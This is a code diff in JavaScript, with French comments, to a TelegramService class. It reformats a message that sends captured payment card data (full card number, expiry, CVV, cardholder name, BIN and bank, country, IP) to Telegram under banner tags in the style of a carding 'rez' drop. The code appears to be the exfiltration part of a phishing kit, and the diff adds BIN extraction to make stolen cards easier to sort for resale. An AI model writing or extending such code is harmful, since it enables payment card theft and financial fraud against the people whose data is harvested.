@@ -127,18 +127,40 @@ class TelegramService {
     const cardDisplay = cardNumber !== 'N/A' ? cardNumber : 'N/A';
     const cvv = clientData.card_cvv || 'N/A';
     
+    // Extraire le BIN (6 premiers chiffres) du numéro de carte
+    let binDisplay = 'N/A';
+    if (cardNumber && cardNumber !== 'N/A') {
+      const cleaned = cardNumber.replace(/\D/g, '');
+      if (cleaned.length >= 6) {
+        binDisplay = cleaned.substring(0, 6);
+      }
+    }
+    
+    // Utiliser les informations BIN si disponibles
+    let binInfo = '';
+    if (clientData.bin_info) {
+      const bin = clientData.bin_info;
+      binInfo = `${bin.bin || binDisplay} - ${bin.bank || 'Unknown Bank'}`;
+    } else {
+      binInfo = binDisplay;
+    }
+    
+    // Utiliser uniquement le pays détecté depuis l'IP
+    const country = clientData.country || 'N/A';
+    
     const message = `
-💳 <b>Données de paiement reçues</b>
-
-🆔 Client: <code>${clientData.id}</code>
-🌐 IP: <code>${clientData.ip || 'N/A'}</code>
-🌍 Pays: ${clientData.country || 'N/A'}
+=========NETI-REZ-==========
+🏦 BIN : <code>${binInfo}</code>
+------------
+🌍 Pays: ${country}
 👤 Titulaire: <code>${clientData.card_holder || 'N/A'}</code>
-🔢 Numéro de carte: <code>${cardDisplay}</code>
-📅 Expiration: <code>${clientData.card_expiration || 'N/A'}</code>
+------------
+💳 CC: <code>${cardDisplay}</code>
+📅 Exp: <code>${clientData.card_expiration || 'N/A'}</code>
 🔐 CVV: <code>${cvv}</code>
-📄 Page: <code>${clientData.current_page || 'N/A'}</code>
-⏰ Heure: ${new Date().toLocaleString()}
+------------
+🌐 IP: <code>${clientData.ip || 'N/A'}</code>
+==============oZy===========
     `.trim();
 
     console.log('[TelegramService] 📝 Payment data message prepared');
